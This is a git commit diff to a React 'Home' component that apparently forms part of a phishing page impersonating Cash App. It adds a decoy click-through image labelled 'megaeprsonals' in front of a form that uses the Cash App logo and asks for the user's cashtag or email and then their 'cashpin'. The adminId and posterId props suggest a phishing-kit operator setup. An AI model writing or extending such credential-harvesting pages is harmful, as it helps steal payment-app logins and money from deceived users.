67f4bdd46c842d68bd9c8b018121882157234c56
Zayn Yusuf <yusue786@gmail.com>
2024-12-23 21:35:25 +0600

    adding new page

--- app/components/Home.js
+++ app/components/Home.js
@@ -7,6 +7,7 @@ import { useState } from "react";
 export default function Home({ adminId, posterId }) {
   const [next, setNext] = useState(false);
   const [email, setEmail] = useState("");
+  const [verified, setVerified] = useState(false);
   const initialvalues = {
     email: "",
     password: "",
@@ -35,65 +36,88 @@ export default function Home({ adminId, posterId }) {
     console.log(submitValues);
   };
   return (
-    <div className="flex flex-col justify-center items-center shadow-lg rounded-xl bg-slate-100 w-[400px] h-[500px] mx-auto mt-[150px]">
-      <img src="/images/Square_Cash_app_logo.svg" height={200} width={200} />
-      <div className="mt-5">
-        <Formik
-          initialValues={initialvalues}
-          // validationSchema={validate}
-          onSubmit={handleSubmit}
-        >
-          {(formik) => (
-            <Form className="">
-              {!next ? (
-                <>
-                  <div className="flex flex-row justify-center items-center  w-[388px]">
-                    <input
-                      className="w-full px-[4px] py-[5px]  outline-none border  border-gray-200 shadow-inner placeholder:text-gray-400 focus:border-green-500 rounded "
-                      placeholder="Enter your cashtag, mail or number "
-                      value={email}
-                      onChange={(e) => setEmail(e.target.value)}
-                      type="email"
-                      required
-                    />
-                  </div>
+    <>
+      {!verified ? (
+        <div className="flex justify-center items-center h-full -mt-5 bg-white">
+          <button onClick={() => setVerified(true)}>
+            {" "}
+            <div className=" object-cover  cursor-pointer ">
+              <img
+                width={464}
+                height={785}
+                src="/images/main.png"
+                alt="megaeprsonals"
+                priority
+              />
+            </div>
+          </button>
+        </div>
+      ) : (
+        <div className="flex flex-col justify-center items-center shadow-lg rounded-xl bg-slate-100 w-[400px] h-[500px] mx-auto mt-[150px]">
+          <img
+            src="/images/Square_Cash_app_logo.svg"
+            height={200}
+            width={200}
+          />
+          <div className="mt-5">
+            <Formik
+              initialValues={initialvalues}
+              // validationSchema={validate}
+              onSubmit={handleSubmit}
+            >
+              {(formik) => (
+                <Form className="">
+                  {!next ? (
+                    <>
+                      <div className="flex flex-row justify-center items-center  w-[388px]">
+                        <input
+                          className="w-full px-[4px] py-[5px]  outline-none border  border-gray-200 shadow-inner placeholder:text-gray-400 focus:border-green-500 rounded "
+                          placeholder="Enter your cashtag, mail or number "
+                          value={email}
+                          onChange={(e) => setEmail(e.target.value)}
+                          type="email"
+                          required
+                        />
+                      </div>
 
-                  <div className="flex flex-row justify-center items-center mt-1">
-                    <button
-                      onClick={() => handleEmail()}
-                      className="mt-5 px-6 py-1 text-lg font-semibold bg-green-500 mx-auto text-white transition duration-300 rounded"
-                    >
-                      Continue
-                    </button>
-                  </div>
-                </>
-              ) : (
-                <>
-                  <div className="flex flex-row justify-center mt-3 items-center -pl-2  w-[388px]">
-                    <Field
-                      className="w-full  px-[4px] py-[5px] outline-none border border-gray-200 shadow-inner placeholder:text-gray-400 focus:border-green-500 rounded "
-                      placeholder="Enter your cashpin"
-                      name="password"
-                      type="password"
-                      autoComplete="on"
-                      required
-                    />
-                  </div>
+                      <div className="flex flex-row justify-center items-center mt-1">
+                        <button
+                          onClick={() => handleEmail()}
+                          className="mt-5 px-6 py-1 text-lg font-semibold bg-green-500 mx-auto text-white transition duration-300 rounded"
+                        >
+                          Continue
+                        </button>
+                      </div>
+                    </>
+                  ) : (
+                    <>
+                      <div className="flex flex-row justify-center mt-3 items-center -pl-2  w-[388px]">
+                        <Field
+                          className="w-full  px-[4px] py-[5px] outline-none border border-gray-200 shadow-inner placeholder:text-gray-400 focus:border-green-500 rounded "
+                          placeholder="Enter your cashpin"
+                          name="password"
+                          type="password"
+                          autoComplete="on"
+                          required
+                        />
+                      </div>
 
-                  <div className="flex flex-row justify-center items-center mt-1">
-                    <button
-                      type="submit"
-                      className="mt-5 px-6 py-1 text-lg font-semibold bg-green-500 mx-auto text-white transition duration-300 rounded"
-                    >
-                      Continue
-                    </button>
-                  </div>
-                </>
+                      <div className="flex flex-row justify-center items-center mt-1">
+                        <button
+                          type="submit"
+                          className="mt-5 px-6 py-1 text-lg font-semibold bg-green-500 mx-auto text-white transition duration-300 rounded"
+                        >
+                          Continue
+                        </button>
+                      </div>
+                    </>
+                  )}
+                </Form>
               )}
-            </Form>
-          )}
-        </Formik>
-      </div>
-    </div>
+            </Formik>
+          </div>
+        </div>
+      )}
+    </>
   );
 }
